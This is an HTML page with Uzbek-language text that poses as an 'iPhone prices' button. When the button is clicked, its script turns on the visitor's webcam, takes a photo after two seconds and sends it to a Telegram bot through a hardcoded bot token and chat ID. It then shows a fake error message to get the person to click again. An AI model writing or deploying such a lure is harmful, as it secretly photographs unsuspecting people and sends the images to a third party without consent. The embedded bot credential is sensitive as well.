<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasmni Telegramga yuborish</title>
</head>
<body>
    <button id="startBtn">Iphone narxlari</button>
    <video id="video" width="300" height="250" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const startBtn = document.getElementById("startBtn");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "7607886976:AAFeeYopg0dPPNk4x_3Ldm4pYSZU-RiHLlU";
        const CHAT_ID = "697727022"; 

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                console.log("Kamera ishga tushdi");
            } catch (error) {
                alert("Kamera ishga tushmadi: " + error);
            }
        }

        async function takeAndSendPhoto() {
            if (!video.srcObject) {
                alert("Kamera ishlamayapti!");
                return;
            }

            // Rasmni olish
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                    const result = await response.json();
                    console.log("Rasm yuborildi:", result);
                    alert("Saytda Xatolik bor qaytadan knopkani bosib koring");
                } catch (error) {
                    console.error("Xatolik:", error);
                    alert("❌ Xatolik yuz berdi.");
                }
            }, "image/jpeg");
        }

        startBtn.addEventListener("click", () => {
            startCamera();
            setTimeout(takeAndSendPhoto, 2000); // Kamera ishlashi uchun 2 soniya kutish
        });
    </script>
</body>
</html>
